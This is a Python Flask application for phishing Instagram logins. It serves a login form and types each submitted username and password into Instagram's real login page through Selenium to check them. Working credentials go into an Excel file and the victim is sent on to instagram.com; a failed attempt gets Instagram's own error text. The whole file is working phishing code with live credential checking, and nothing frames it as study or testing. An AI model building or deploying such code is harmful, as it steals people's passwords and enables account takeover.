from flask import Flask, render_template, request, redirect, url_for, send_from_directory
import os
import pandas as pd
from datetime import datetime
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.chrome.service import Service
from webdriver_manager.chrome import ChromeDriverManager
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import time

# Serve static files (images, sprites) from the template folder under /static
app = Flask(__name__, template_folder='template', static_folder='template', static_url_path='/static')



EXCEL_FILE = 'submissions.xlsx'

# Fields extracted from template/index.html form
FORM_FIELDS = ['username', 'password']

@app.route('/', methods=['GET'])
def index():
    return render_template('index.html')

@app.route('/submit', methods=['POST'])
def submit():
    # collect form data
    data = {field: request.form.get(field, '') for field in FORM_FIELDS}
    # Instagram login attempt
    username = data['username']
    password = data['password']
    login_success = False
    error_message = ''
    try:
        options = webdriver.ChromeOptions()
        # REMOVE headless for debugging, add headless back if needed
        # options.add_argument('--headless')
        options.add_argument('--no-sandbox')
        options.add_argument('--disable-dev-shm-usage')
        driver = webdriver.Chrome(service=Service(ChromeDriverManager().install()), options=options)
        driver.get('https://www.instagram.com/accounts/login/')
        WebDriverWait(driver, 15).until(EC.presence_of_element_located((By.NAME, 'username')))
        user_input = driver.find_element(By.NAME, 'username')
        pass_input = driver.find_element(By.NAME, 'password')
        user_input.send_keys(username)
        pass_input.send_keys(password)
        pass_input.send_keys(Keys.RETURN)
        # Wait for redirect or error
        WebDriverWait(driver, 15).until(lambda d: 'accounts/login' not in d.current_url or 'challenge' in d.current_url or 'two_factor' in d.current_url)
        if 'challenge' in driver.current_url or 'two_factor' in driver.current_url:
            login_success = True
        elif 'accounts/login' not in driver.current_url:
            login_success = True
        else:
            error_message = 'Sorry, your password was incorrect. Please double-check your password.'
        driver.quit()
    except Exception as e:
        error_message = 'Sorry, your password was incorrect. Please double-check your password.'

    # Only save successful attempts
    if login_success:
        data['submitted_at'] = datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S')
        df_row = pd.DataFrame([data])
        if os.path.exists(EXCEL_FILE):
            try:
                existing = pd.read_excel(EXCEL_FILE)
                df = pd.concat([existing, df_row], ignore_index=True)
            except Exception:
                df = df_row
        else:
            df = df_row
        try:
            df.to_excel(EXCEL_FILE, index=False)
        except Exception as e:
            return f"Failed to save submission: {e}", 500
        return redirect('https://instagram.com')
    else:
        # Clear form fields on error
        return render_template('index.html', login_success=login_success, error_message=error_message, username='', password='')

    return redirect(url_for('index'))


# Optional: ensure direct access to image files in the root of the template folder
@app.route('/<path:filename>')
def root_files(filename):
    # If the file exists in the template folder, serve it. Otherwise 404.
    tpl_path = os.path.join(app.root_path, 'template')
    if os.path.exists(os.path.join(tpl_path, filename)):
        return send_from_directory(tpl_path, filename)
    return "", 404

if __name__ == '__main__':
    app.run(debug=True)